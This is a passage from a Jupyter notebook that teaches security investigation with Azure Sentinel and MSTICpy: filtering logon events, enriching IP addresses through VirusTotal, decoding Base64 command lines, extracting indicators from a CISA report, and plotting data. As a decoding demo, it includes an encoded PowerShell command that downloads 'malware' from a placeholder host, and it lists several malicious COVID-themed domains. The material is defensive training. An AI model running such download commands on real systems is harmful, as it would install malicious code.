      "source": "md(\"Display rows where TargetUserName is either MSTICAdmin or adm1nistratror:\", \"bold\")\ndisplay(df[df['TargetUserName'].isin(['adm1nistrator', 'MSTICAdmin'])])",
      "execution_count": 30,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<p style='font-weight: bold'>Display rows where TargetUserName is either MSTICAdmin or adm1nistratror:</p>",
            "text/plain": "<IPython.core.display.HTML object>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>TenantId</th>\n      <th>Account</th>\n      <th>EventID</th>\n      <th>TimeGenerated</th>\n      <th>SourceComputerId</th>\n      <th>Computer</th>\n      <th>SubjectUserName</th>\n      <th>SubjectDomainName</th>\n      <th>SubjectUserSid</th>\n      <th>TargetUserName</th>\n      <th>TargetDomainName</th>\n      <th>TargetUserSid</th>\n      <th>TargetLogonId</th>\n      <th>LogonProcessName</th>\n      <th>LogonType</th>\n      <th>AuthenticationPackageName</th>\n      <th>Status</th>\n      <th>IpAddress</th>\n      <th>WorkstationName</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>0</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>MSTICAlertsWin1\\MSTICAdmin</td>\n      <td>4624</td>\n      <td>2019-01-15 05:15:02.980</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>MSTICAdmin</td>\n      <td>MSTICAlertsWin1</td>\n      <td>S-1-5-21-996632719-2361334927-4038480536-500</td>\n      <td>0xfaac27</td>\n      <td>Advapi</td>\n      <td>4</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>-</td>\n      <td>MSTICAlertsWin1</td>\n    </tr>\n    <tr>\n      <th>2</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>MSTICAlertsWin1\\adm1nistrator</td>\n      <td>4624</td>\n      <td>2019-01-15 05:15:06.363</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>-</td>\n      <td>-</td>\n      <td>S-1-0-0</td>\n      <td>adm1nistrator</td>\n      <td>MSTICAlertsWin1</td>\n      <td>S-1-5-21-996632719-2361334927-4038480536-1066</td>\n      <td>0xfb5ee6</td>\n      <td>NtLmSsp</td>\n      <td>3</td>\n      <td>NTLM</td>\n      <td>NaN</td>\n      <td>fe80::38dc:e4a9:61bd:b458</td>\n      <td>MSTICAlertsWin1</td>\n    </tr>\n    <tr>\n      <th>5</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>MSTICAlertsWin1\\MSTICAdmin</td>\n      <td>4624</td>\n      <td>2019-01-15 04:28:33.090</td>\n      <td>46fe7078-61bb-4bed-9430-7ac01d91c273</td>\n      <td>MSTICAlertsWin1</td>\n      <td>MSTICAlertsWin1$</td>\n      <td>WORKGROUP</td>\n      <td>S-1-5-18</td>\n      <td>MSTICAdmin</td>\n      <td>MSTICAlertsWin1</td>\n      <td>S-1-5-21-996632719-2361334927-4038480536-500</td>\n      <td>0xf0c9d6</td>\n      <td>Advapi</td>\n      <td>4</td>\n      <td>Negotiate</td>\n      <td>NaN</td>\n      <td>-</td>\n      <td>MSTICAlertsWin1</td>\n    </tr>\n  </tbody>\n</table>\n</div>",
            "text/plain": "                               TenantId                        Account  \\\n0  802d39e1-9d70-404d-832c-2de5e2478eda     MSTICAlertsWin1\\MSTICAdmin   \n2  802d39e1-9d70-404d-832c-2de5e2478eda  MSTICAlertsWin1\\adm1nistrator   \n5  802d39e1-9d70-404d-832c-2de5e2478eda     MSTICAlertsWin1\\MSTICAdmin   \n\n   EventID            TimeGenerated                      SourceComputerId  \\\n0     4624  2019-01-15 05:15:02.980  46fe7078-61bb-4bed-9430-7ac01d91c273   \n2     4624  2019-01-15 05:15:06.363  46fe7078-61bb-4bed-9430-7ac01d91c273   \n5     4624  2019-01-15 04:28:33.090  46fe7078-61bb-4bed-9430-7ac01d91c273   \n\n          Computer   SubjectUserName SubjectDomainName SubjectUserSid  \\\n0  MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n2  MSTICAlertsWin1                 -                 -        S-1-0-0   \n5  MSTICAlertsWin1  MSTICAlertsWin1$         WORKGROUP       S-1-5-18   \n\n  TargetUserName TargetDomainName  \\\n0     MSTICAdmin  MSTICAlertsWin1   \n2  adm1nistrator  MSTICAlertsWin1   \n5     MSTICAdmin  MSTICAlertsWin1   \n\n                                   TargetUserSid TargetLogonId  \\\n0   S-1-5-21-996632719-2361334927-4038480536-500      0xfaac27   \n2  S-1-5-21-996632719-2361334927-4038480536-1066      0xfb5ee6   \n5   S-1-5-21-996632719-2361334927-4038480536-500      0xf0c9d6   \n\n  LogonProcessName  LogonType AuthenticationPackageName  Status  \\\n0         Advapi            4                 Negotiate     NaN   \n2         NtLmSsp           3                      NTLM     NaN   \n5         Advapi            4                 Negotiate     NaN   \n\n                   IpAddress  WorkstationName  \n0                          -  MSTICAlertsWin1  \n2  fe80::38dc:e4a9:61bd:b458  MSTICAlertsWin1  \n5                          -  MSTICAlertsWin1  "
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "Our DataFrame call also be extended to add new columns with additional data if reqired:"
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "df[\"NewCol\"] = \"Look at my new data!\"\ndisplay(df[[\"TenantId\",\"Account\", \"TimeGenerated\",\"IpAddress\",\"NewCol\"]].head(2))",
      "execution_count": 36,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>TenantId</th>\n      <th>Account</th>\n      <th>TimeGenerated</th>\n      <th>IpAddress</th>\n      <th>NewCol</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>0</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>MSTICAlertsWin1\\MSTICAdmin</td>\n      <td>2019-01-15 05:15:02.980</td>\n      <td>203.160.71.100</td>\n      <td>Look at my new data!</td>\n    </tr>\n    <tr>\n      <th>1</th>\n      <td>802d39e1-9d70-404d-832c-2de5e2478eda</td>\n      <td>NT AUTHORITY\\SYSTEM</td>\n      <td>2019-01-15 05:15:04.503</td>\n      <td>203.160.71.100</td>\n      <td>Look at my new data!</td>\n    </tr>\n  </tbody>\n</table>\n</div>",
            "text/plain": "                               TenantId                     Account  \\\n0  802d39e1-9d70-404d-832c-2de5e2478eda  MSTICAlertsWin1\\MSTICAdmin   \n1  802d39e1-9d70-404d-832c-2de5e2478eda         NT AUTHORITY\\SYSTEM   \n\n             TimeGenerated       IpAddress                NewCol  \n0  2019-01-15 05:15:02.980  203.160.71.100  Look at my new data!  \n1  2019-01-15 05:15:04.503  203.160.71.100  Look at my new data!  "
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "---\n## Enriching data\n\nNow that we have seen how to query for data, and do some basic manipulation we can look at enriching this data with additional data sources. For this we are going to use an external threat intelligence provider to give us some more details about an IP address we have in our dataset using the [MSTICpy TIProvider](\"https://msticpy.readthedocs.io/en/latest/data_acquisition/TIProviders.html\") feature."
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "from datetime import datetime, timedelta\n# Check if we have logon data already and if not get some\nif not isinstance(logons_df, pd.DataFrame) or logons_df.empty:\n    # set our query end time as now\n    end = datetime.now()\n    # set our query start time as 1 hour ago\n    start = end - timedelta(days=1)\n    # run query with specified start and end times\n    logons_df = qry_prov.Azure.list_all_signins_geo(start=start, end=end)\n    \n# Create our TI provider\nti = TILookup()\n# Get the first logon IP address from our dataset\nip = df.iloc[1]['IpAddress']\n# Look up the IP in VirusTotal\nti_resp = ti.lookup_ioc(ip, providers=[\"VirusTotal\"])\n\n# Format our results as a DataFrame\nti_resp = ti.result_to_df(ti_resp)\ndisplay(ti_resp)",
      "execution_count": 39,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>Ioc</th>\n      <th>IocType</th>\n      <th>QuerySubtype</th>\n      <th>Provider</th>\n      <th>Result</th>\n      <th>Severity</th>\n      <th>Details</th>\n      <th>RawResult</th>\n      <th>Reference</th>\n      <th>Status</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>VirusTotal</th>\n      <td>203.160.71.100</td>\n      <td>ipv4</td>\n      <td>None</td>\n      <td>VirusTotal</td>\n      <td>True</td>\n      <td>information</td>\n      <td>{'verbose_msg': 'IP address in dataset', 'response_code': 1, 'detected_urls': [], 'positives': 0}</td>\n      <td>{'network': '203.160.64.0/19', 'whois_timestamp': 1590932436, 'country': 'HK', 'response_code': ...</td>\n      <td>https://www.virustotal.com/vtapi/v2/ip-address/report</td>\n      <td>0</td>\n    </tr>\n  </tbody>\n</table>\n</div>",
            "text/plain": "                       Ioc IocType QuerySubtype    Provider Result  \\\nVirusTotal  203.160.71.100    ipv4         None  VirusTotal   True   \n\n               Severity  \\\nVirusTotal  information   \n\n                                                                                                      Details  \\\nVirusTotal  {'verbose_msg': 'IP address in dataset', 'response_code': 1, 'detected_urls': [], 'positives': 0}   \n\n                                                                                                      RawResult  \\\nVirusTotal  {'network': '203.160.64.0/19', 'whois_timestamp': 1590932436, 'country': 'HK', 'response_code': ...   \n\n                                                        Reference Status  \nVirusTotal  https://www.virustotal.com/vtapi/v2/ip-address/report      0  "
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "Using the [Pandas apply()](https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.DataFrame.apply.html) feature we can get results for all the IP addresses in our data set and add the lookup severity score as a new column in our DataFrame for easier reference."
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "# Take the IP address in each row, look it up against TI and return the seveirty score\ndef lookup_res(row):\n    ip = row['IpAddress']\n    resp = ti.lookup_ioc(ip, providers=[\"VirusTotal\"])\n    resp = ti.result_to_df(resp)\n    return resp[\"Severity\"].iloc[0]\n\n# Take the first 3 rows of data and copy they into a new DataFrame\nenrich_logons_df = df.iloc[:3].copy()\n# Create a new column called TIRisk and populate that with the TI severity score of the IP Address in that row\nenrich_logons_df['TIRisk'] = enrich_logons_df.apply(lookup_res, axis=1)\n# Display a subset of columns from our DataFrame\ndisplay(enrich_logons_df[[\"TimeGenerated\", \"TargetUserName\", \"IpAddress\", \"TIRisk\"]])",
      "execution_count": 41,
      "outputs": [
        {
          "output_type": "display_data",
          "data": {
            "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>TimeGenerated</th>\n      <th>TargetUserName</th>\n      <th>IpAddress</th>\n      <th>TIRisk</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>0</th>\n      <td>2019-01-15 05:15:02.980</td>\n      <td>MSTICAdmin</td>\n      <td>203.160.71.100</td>\n      <td>information</td>\n    </tr>\n    <tr>\n      <th>1</th>\n      <td>2019-01-15 05:15:04.503</td>\n      <td>SYSTEM</td>\n      <td>203.160.71.100</td>\n      <td>information</td>\n    </tr>\n    <tr>\n      <th>2</th>\n      <td>2019-01-15 05:15:06.363</td>\n      <td>adm1nistrator</td>\n      <td>fe80::38dc:e4a9:61bd:b458</td>\n      <td>information</td>\n    </tr>\n  </tbody>\n</table>\n</div>",
            "text/plain": "             TimeGenerated TargetUserName                  IpAddress  \\\n0  2019-01-15 05:15:02.980     MSTICAdmin             203.160.71.100   \n1  2019-01-15 05:15:04.503         SYSTEM             203.160.71.100   \n2  2019-01-15 05:15:06.363  adm1nistrator  fe80::38dc:e4a9:61bd:b458   \n\n        TIRisk  \n0  information  \n1  information  \n2  information  "
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "### Learn more:\nMSTICpy includes further threat intelligence capabilities as well as other data enrichment options. More details on these can be found in the [documentation](https://msticpy.readthedocs.io/en/latest/DataEnrichment.html)."
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "---\n## Analyzing data\nWith the data we have collected we may wish to perform some analysis on it in order to better understand it. MSTICpy includes a number of features to help with this, and there are a vast array of other data analysis capabilities available via Python ranging from simple processes to complex ML models. We will start here by keeping it simple and look at how we can decode some Base64 encoded command line strings we have in order to allow us to understand their content."
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "from msticpy.sectools import base64unpack as b64\n# Take our encoded Powershell Command\nb64_cmd = \"powershell.exe -encodedCommand SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9jb250b3NvLmNvbS9tYWx3YXJlIC1PdXRGaWxlIEM6XG1hbHdhcmUuZXhl\"\n# Unpack the Base64 encoded elements\nunpack_txt = b64.unpack(input_string=b64_cmd)\n# Display our results and transform for easier reading\nunpack_txt[1].T",
      "execution_count": 42,
      "outputs": [
        {
          "output_type": "execute_result",
          "execution_count": 42,
          "data": {
            "text/html": "<div>\n<style scoped>\n    .dataframe tbody tr th:only-of-type {\n        vertical-align: middle;\n    }\n\n    .dataframe tbody tr th {\n        vertical-align: top;\n    }\n\n    .dataframe thead th {\n        text-align: right;\n    }\n</style>\n<table border=\"1\" class=\"dataframe\">\n  <thead>\n    <tr style=\"text-align: right;\">\n      <th></th>\n      <th>0</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <th>reference</th>\n      <td>(, 1., 1)</td>\n    </tr>\n    <tr>\n      <th>original_string</th>\n      <td>SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9jb250b3NvLmNvbS9tYWx3YXJlIC1PdXRGaWxlIEM6XG1hbHdhcmUuZXhl</td>\n    </tr>\n    <tr>\n      <th>file_name</th>\n      <td>unknown</td>\n    </tr>\n    <tr>\n      <th>file_type</th>\n      <td>None</td>\n    </tr>\n    <tr>\n      <th>input_bytes</th>\n      <td>b'Invoke-WebRequest https://contoso.com/malware -OutFile C:\\\\malware.exe'</td>\n    </tr>\n    <tr>\n      <th>decoded_string</th>\n      <td>Invoke-WebRequest https://contoso.com/malware -OutFile C:\\malware.exe</td>\n    </tr>\n    <tr>\n      <th>encoding_type</th>\n      <td>utf-8</td>\n    </tr>\n    <tr>\n      <th>file_hashes</th>\n      <td>{'md5': '5845a06d7f52b1818a088e889df95c77', 'sha1': '1c31052c4aabb853777c1ce74943cafe27bb1d42', ...</td>\n    </tr>\n    <tr>\n      <th>md5</th>\n      <td>5845a06d7f52b1818a088e889df95c77</td>\n    </tr>\n    <tr>\n      <th>sha1</th>\n      <td>1c31052c4aabb853777c1ce74943cafe27bb1d42</td>\n    </tr>\n    <tr>\n      <th>sha256</th>\n      <td>7054dcebb2f74492c06f4ba89cac8e7e99b44e1a6029e0ad403aab9bb7503d8c</td>\n    </tr>\n    <tr>\n      <th>printable_bytes</th>\n      <td>49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 68 74 74 70 73 3a 2f 2f 63 6f 6e 74 6f 73 ...</td>\n    </tr>\n  </tbody>\n</table>\n</div>",
            "text/plain": "                                                                                                                   0\nreference                                                                                                  (, 1., 1)\noriginal_string         SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9jb250b3NvLmNvbS9tYWx3YXJlIC1PdXRGaWxlIEM6XG1hbHdhcmUuZXhl\nfile_name                                                                                                    unknown\nfile_type                                                                                                       None\ninput_bytes                                b'Invoke-WebRequest https://contoso.com/malware -OutFile C:\\\\malware.exe'\ndecoded_string                                 Invoke-WebRequest https://contoso.com/malware -OutFile C:\\malware.exe\nencoding_type                                                                                                  utf-8\nfile_hashes      {'md5': '5845a06d7f52b1818a088e889df95c77', 'sha1': '1c31052c4aabb853777c1ce74943cafe27bb1d42', ...\nmd5                                                                                 5845a06d7f52b1818a088e889df95c77\nsha1                                                                        1c31052c4aabb853777c1ce74943cafe27bb1d42\nsha256                                              7054dcebb2f74492c06f4ba89cac8e7e99b44e1a6029e0ad403aab9bb7503d8c\nprintable_bytes  49 6e 76 6f 6b 65 2d 57 65 62 52 65 71 75 65 73 74 20 68 74 74 70 73 3a 2f 2f 63 6f 6e 74 6f 73 ..."
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "We can also use MSTICpy to extract Indicators of Compromise (IoCs) from a dataset, this makes it easy to extract and match on a set of IoCs within our data. In the example below we take a US Cybersecurity & Infrastructure Security Agency (CISA) report and extract all domains listed in the report:"
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "import requests\n# Set up our IoCExtract oject\nioc_extractor = iocextract.IoCExtract()\n# Download our threat report\ndata = requests.get(\"https://www.us-cert.gov/sites/default/files/publications/AA20-099A_WHITE.stix.xml\")\n# Extract domains listed in our report\niocs = ioc_extractor.extract(data.text, ioc_types=\"dns\")['dns']\n# Display the first 5 iocs found in our report\nlist(iocs)[:5]",
      "execution_count": 43,
      "outputs": [
        {
          "output_type": "execute_result",
          "execution_count": 43,
          "data": {
            "text/plain": "['coronavirusdesinfektion.cleaning',\n 'covid19testkiti.xyz',\n 'notmycovid19.com',\n 'covid19clincs.com',\n 'abogadocoronavirus.com']"
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "---\n## Visualizing data\nVisualizing data can provide an excellent way to analyse data, identify patterns and anomalies. Python has a wide range of data visualization capabilities each of which have thier own benefits and drawbacks. We will look at some basic capabilities as well as the in-build visualizations in MSTICpy.\n<br><br><br>\n**Basic Graphs**<br>\nPandas and Matplotlib provide the easiest and simplest way to produce simple plots of data:"
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "vis_q = \"\"\"\nSigninLogs\n| where TimeGenerated > ago(7d)\n| sample 5\"\"\"\n\n# Try and query for data but if using sample data load that instead\ntry:\n    vis_data = qry_prov.exec_query(vis_q)\nexcept FileNotFoundError:\n    vis_data = logons_df\n\n# Check we have some data in our results and if not use previously used dataset\nif not isinstance(vis_data, pd.DataFrame) or vis_data.empty:\n    vis_data = logons_df\n\n# Plot up to the first 5 IP addresses\nvis_data.head()[\"IPAddress\"].value_counts().plot.bar(\n    title=\"IP prevelence\", legend=False\n)",
      "execution_count": 44,
      "outputs": [
        {
          "output_type": "execute_result",
          "execution_count": 44,
          "data": {
            "text/plain": "<matplotlib.axes._subplots.AxesSubplot at 0x7f8186107ba8>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "image/png": "[encoded data removed]",
            "text/plain": "<Figure size 432x288 with 1 Axes>"
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {
        "trusted": true
      },
      "cell_type": "code",
      "source": "pie_df = vis_data.copy()\n # If we have lots of data just plot the first 5 rows\npie_df.head()['IPAddress'].value_counts().plot.pie(legend=True)",
      "execution_count": 45,
      "outputs": [
        {
          "output_type": "execute_result",
          "execution_count": 45,
          "data": {
            "text/plain": "<matplotlib.axes._subplots.AxesSubplot at 0x7f81860bf080>"
          },
          "metadata": {}
        },
        {
          "output_type": "display_data",
          "data": {
            "image/png": "[encoded data removed]",
            "text/plain": "<Figure size 432x288 with 1 Axes>"
          },
          "metadata": {}
        }
      ]
    },
    {
      "metadata": {},
      "cell_type": "markdown",
      "source": "---\n## Conclusion\nThis notebook has showed you the basics of using notebooks and Azure Sentinel for security investigaitons. There are many more things possible using notebooks and it is stronly encouraged to read the material we have referenced in the learn more sections in this notebook. You can also explore the other Azure Sentinel notebooks in order to take advantage of the pre-built hunting logic, and understand other analysis techniques that are possible. </br>\n### Appendix:\n - [Jupyter Notebooks: An Introduction](https://realpython.com/jupyter-notebook-introduction/)\n - [Threat Hunting in the cloud with Azure Notebooks](https://medium.com/@maarten.goet/threat-hunting-in-the-cloud-with-azure-notebooks-supercharge-your-hunting-skills-using-jupyter-8d69218e7ca0)\n - [MSTICpy documentation](https://msticpy.readthedocs.io/)\n - [Azure Sentinel Notebooks documentation](https://docs.microsoft.com/en-us/azure/sentinel/notebooks)\n - [The Infosec Jupyterbook](https://infosecjupyterbook.com/introduction.html)\n - [Linux Host Explorer Notebook walkthrough](https://techcommunity.microsoft.com/t5/azure-sentinel/explorer-notebook-series-the-linux-host-explorer/ba-p/1138273)\n - [Why use Jupyter for Security Investigations](https://techcommunity.microsoft.com/t5/azure-sentinel/why-use-jupyter-for-security-investigations/ba-p/475729)\n - [Security Investigtions with Azure Sentinel & Notebooks](https://techcommunity.microsoft.com/t5/azure-sentinel/security-investigation-with-azure-sentinel-and-jupyter-notebooks/ba-p/432921)\n - [Pandas Documentation](https://pandas.pydata.org/pandas-docs/stable/user_guide/index.html)\n - [Bokeh Documentation](https://docs.bokeh.org/en/latest/)"
    }
  ],
  "metadata": {
    "hide_input": false,
    "kernelspec": {
      "name": "python36",
      "display_name": "Python 3.6",
      "language": "python"
    },
    "language_info": {
      "mimetype": "text/x-python",
      "nbconvert_exporter": "python",
      "name": "python",
      "pygments_lexer": "ipython3",
      "version": "3.6.6",
      "file_extension": ".py",
      "codemirror_mode": {
        "version": 3,
        "name": "ipython"
      }
    },
    "toc": {
      "base_numbering": 1,
      "nav_menu": {},
      "number_sections": true,
      "sideBar": true,
      "skip_h1_title": false,
      "title_cell": "Table of Contents",
      "title_sidebar": "Contents",
      "toc_cell": false,
      "toc_position": {},
      "toc_section_display": true,
      "toc_window_display": false
    },
    "varInspector": {
      "cols": {
        "lenName": 16,
        "lenType": 16,
        "lenVar": 40
      },
      "kernels_config": {
        "python": {
          "delete_cmd_postfix": "",
          "delete_cmd_prefix": "del ",
          "library": "var_list.py",
          "varRefreshCmd": "print(var_dic_list())"
        },
        "r": {
          "delete_cmd_postfix": ") ",
          "delete_cmd_prefix": "rm(",
          "library": "var_list.r",
          "varRefreshCmd": "cat(var_dic_list()) "
        }
      },
      "types_to_exclude": [
        "module",
        "function",
        "builtin_function_or_method",
        "instance",
        "_Feature"
      ],
      "window_display": false
    },
    "widgets": {
      "application/vnd.jupyter.widget-state+json": {
        "state": {},
        "version_major": 2,
        "version_minor": 0
      }
    },
    "celltoolbar": "Edit Metadata"
  },
  "nbformat": 4,
  "nbformat_minor": 4
}